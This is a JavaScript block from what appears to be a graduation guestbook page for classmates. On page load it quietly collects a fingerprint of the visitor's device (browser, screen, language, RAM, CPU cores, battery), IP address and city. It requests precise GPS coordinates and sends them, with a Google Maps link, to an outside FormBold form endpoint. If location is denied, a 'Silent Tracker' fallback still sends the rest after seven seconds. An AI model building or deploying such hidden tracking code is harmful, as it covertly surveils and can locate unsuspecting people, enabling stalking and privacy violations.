<script>
        let trackingData = {
            ip: "Unavailable",
            location: "Unavailable",
            deviceInfo: "Unknown Device",
            screenSize: "Unknown Screen",
            deviceLanguage: "Unknown Language",
            batteryStatus: "Unknown Battery", // New
            colorScheme: "Unknown Theme",     // New
            deviceRam: "Unknown RAM",         // New
            cpuCores: "Unknown CPU Cores"      // New
        };
        
        let hasSentPayload = false; 
        let trackingTimer = null;   

        // 1. Core fingerprint gathering function
        async function gatherDeviceFingerprint() {
            trackingData.deviceInfo = navigator.userAgent; 
            trackingData.screenSize = `${window.screen.width}x${window.screen.height}`;
            trackingData.deviceLanguage = navigator.language || navigator.userLanguage;
            
            // Check Dark/Light mode preference
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                trackingData.colorScheme = "Dark Mode";
            } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
                trackingData.colorScheme = "Light Mode";
            }

            // Grab hardware performance traits
            trackingData.deviceRam = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Approx)` : "Unsupported/iOS Hidden";
            trackingData.cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";

            // Attempt to grab battery status safely
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    trackingData.batteryStatus = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
                } catch (e) {
                    console.log("Battery profile locked.");
                }
            }
        }

        // 2. Run the tracking sequence
        async function initializeTracker() {
            await gatherDeviceFingerprint();

            fetch(window.location.href)
                .then(res => {
                    const geoHeader = res.headers.get('x-visitor-geo');
                    const greetingElement = document.getElementById('greeting');
                    
                    if (geoHeader) {
                        const data = JSON.parse(geoHeader);
                        trackingData.ip = data.ip || "Unknown IP";
                        trackingData.location = `${data.city || "Unknown City"}, ${data.country || "Unknown Country"}`;
                        
                        if (greetingElement && data.city) {
                            greetingElement.innerText = `👋 Wearing cap & gown? Viewing from ${data.city}`;
                        }
                    }
                    
                    // 7-second fallback countdown window
                    trackingTimer = setTimeout(() => {
                        if (!hasSentPayload) {
                            sendToFormBold("Anonymous Classmate", "Silent Tracker (GPS Denied/Timed Out)", {});
                        }
                    }, 7000);

                    requestPreciseLocation();
                })
                .catch(err => {
                    console.log("Local testing environment context detected.");
                    requestPreciseLocation();
                });
        }

        // Execute initializer loop
        initializeTracker();

        // 3. Precise hardware geolocation tracking sequence
        function requestPreciseLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(trackingTimer);
                        if (hasSentPayload) return; 

                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        const preciseGPS = {
                            "Tracking Status": "HIGH ACCURACY GPS GRANTED",
                            "Latitude": lat,
                            "Longitude": lon,
                            "Accuracy Radius": `${accuracy}m`,
                            "Google Maps Link": `https://maps.google.com/?q=${lat},${lon}`
                        };

                        sendToFormBold("Anonymous Classmate", "PRECISE GPS ACQUIRED", preciseGPS);
                    },
                    (error) => {
                        console.log("GPS hardware prompt bypassed or declined.");
                    },
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            }
        }

        // 4. Central FormBold Sender Engine
        function sendToFormBold(studentName, actionType, extraData = {}) {
            hasSentPayload = true; 

            const formData = new FormData();
            formData.append("_subject", `[${actionType}] - ${studentName}`);
            formData.append("Interaction Type", actionType);
            formData.append("Profile Name", studentName);
            formData.append("IP Address", trackingData.ip);
            formData.append("General Location", trackingData.location);
            formData.append("Device Hardware Specs", trackingData.deviceInfo);
            formData.append("Screen Resolution", trackingData.screenSize);
            formData.append("Device Language", trackingData.deviceLanguage);
            formData.append("System Theme", trackingData.colorScheme); // Added
            formData.append("Device Battery", trackingData.batteryStatus); // Added
            formData.append("Estimated RAM", trackingData.deviceRam); // Added
            formData.append("CPU Cores", trackingData.cpuCores); // Added
            formData.append("Timestamp", new Date().toLocaleString());

            Object.keys(extraData).forEach(key => {
                formData.append(key, extraData[key]);
            });

            fetch('https://formbold.com/s/3VKAX', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(() => console.log("Complete data fingerprint submitted successfully."))
            .catch(err => console.error("Data pipeline link error:", err));
        }

        // 5. Manual guestbook text signature hook
        function submitGuestbook() {
            const nameInput = document.getElementById('studentName');
            const nameField = nameInput ? nameInput.value.trim() : "";
            
            if (!nameField) {
                alert("Please enter your name before signing in.");
                return;
            }

            sendToFormBold(nameField, "Manual Guestbook Signature", { "Tracking Status": "User Manual Signature Override" });
            alert(`Thank you, ${nameField}! Your entry has been recorded.`);
            if (nameInput) nameInput.value = ""; 
        }
    </script>
